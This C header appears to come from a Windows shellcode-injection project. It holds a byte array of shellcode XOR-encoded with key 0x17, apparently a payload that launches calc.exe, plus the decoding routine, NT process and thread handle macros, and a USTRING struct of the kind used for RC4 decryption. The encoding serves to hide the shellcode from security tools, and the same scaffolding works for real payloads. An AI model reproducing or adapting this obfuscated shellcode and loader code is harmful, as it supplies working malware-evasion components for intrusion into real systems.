#pragma once

#include <windows.h>

typedef _Return_type_success_(return >= 0) LONG NTSTATUS;
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define ok(strong, ...) (printf("\033[32m[+] " strong "\033[0m\n", ##__VA_ARGS__))
#define info(strong, ...) (printf("\033[36m[*] " strong "\033[0m\n", ##__VA_ARGS__))
#define error(strong, ...) (printf("\033[31m[-] " strong "\nError Code: %ld\n\033[0m", ##__VA_ARGS__, GetLastError()))
#define yolo()                              \
    printf("[*] Now Exiting. T-T See Ya."); \
    return EXIT_FAILURE;

#define NtCurrentProcess() ( ( HANDLE ) ( LONG_PTR ) -1 )
#define NtCurrentThread() ( ( HANDLE ) ( LONG_PTR ) -2 )

unsigned char calc[] =
"\xeb\x5f\x94\xf3\xe7\xff\xd7\x17\x17\x17\x56\x46"
"\x56\x47\x45\x46\x41\x5f\x26\xc5\x72\x5f\x9c\x45"
"\x77\x5f\x9c\x45\x0f\x5f\x9c\x45\x37\x5f\x9c\x65"
"\x47\x5f\x18\xa0\x5d\x5d\x5a\x26\xde\x5f\x26\xd7"
"\xbb\x2b\x76\x6b\x15\x3b\x37\x56\xd6\xde\x1a\x56"
"\x16\xd6\xf5\xfa\x45\x56\x46\x5f\x9c\x45\x37\x9c"
"\x55\x2b\x5f\x16\xc7\x9c\x97\x9f\x17\x17\x17\x5f"
"\x92\xd7\x63\x70\x5f\x16\xc7\x47\x9c\x5f\x0f\x53"
"\x9c\x57\x37\x5e\x16\xc7\xf4\x41\x5f\xe8\xde\x56"
"\x9c\x23\x9f\x5f\x16\xc1\x5a\x26\xde\x5f\x26\xd7"
"\xbb\x56\xd6\xde\x1a\x56\x16\xd6\x2f\xf7\x62\xe6"
"\x5b\x14\x5b\x33\x1f\x52\x2e\xc6\x62\xcf\x4f\x53"
"\x9c\x57\x33\x5e\x16\xc7\x71\x56\x9c\x1b\x5f\x53"
"\x9c\x57\x0b\x5e\x16\xc7\x56\x9c\x13\x9f\x5f\x16"
"\xc7\x56\x4f\x56\x4f\x49\x4e\x4d\x56\x4f\x56\x4e"
"\x56\x4d\x5f\x94\xfb\x37\x56\x45\xe8\xf7\x4f\x56"
"\x4e\x4d\x5f\x9c\x05\xfe\x40\xe8\xe8\xe8\x4a\x5f"
"\xad\x16\x17\x17\x17\x17\x17\x17\x17\x5f\x9a\x9a"
"\x16\x16\x17\x17\x56\xad\x26\x9c\x78\x90\xe8\xc2"
"\xac\xf7\x0a\x3d\x1d\x56\xad\xb1\x82\xaa\x8a\xe8"
"\xc2\x5f\x94\xd3\x3f\x2b\x11\x6b\x1d\x97\xec\xf7"
"\x62\x12\xac\x50\x04\x65\x78\x7d\x17\x4e\x56\x9e"
"\xcd\xe8\xc2\x54\x2d\x4b\x40\x7e\x79\x73\x78\x60"
"\x64\x4b\x44\x6e\x64\x63\x72\x7a\x24\x25\x4b\x74"
"\x76\x7b\x74\x39\x72\x6f\x72\x17";

size_t szCalc = sizeof(calc);

void ShellCodeXOR(char* buffer, size_t length, int key) {
    // XOR cipher implementation
    for (size_t i = 0; i < length; i++) {
        buffer[i] ^= key;
    }
}

int key = 0x17;

typedef struct
{
    DWORD	Length;
    DWORD	MaximumLength;
    PVOID	Buffer;
} USTRING;